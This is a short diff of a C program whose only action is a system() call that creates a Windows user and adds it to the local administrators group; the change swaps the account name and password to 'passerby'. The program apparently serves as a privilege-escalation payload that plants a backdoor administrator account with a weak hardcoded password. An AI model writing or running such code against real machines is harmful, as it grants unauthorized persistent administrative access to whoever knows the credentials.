@@ -3,6 +3,6 @@
 int main ()
 {
   int i;
-  i=system ("net user ihack4falafel <password> /add && net localgroup administrators ihack4falfel /add");
+  i=system ("net user passerby passerby /add && net localgroup administrators passerby /add");
   return 0;
 }
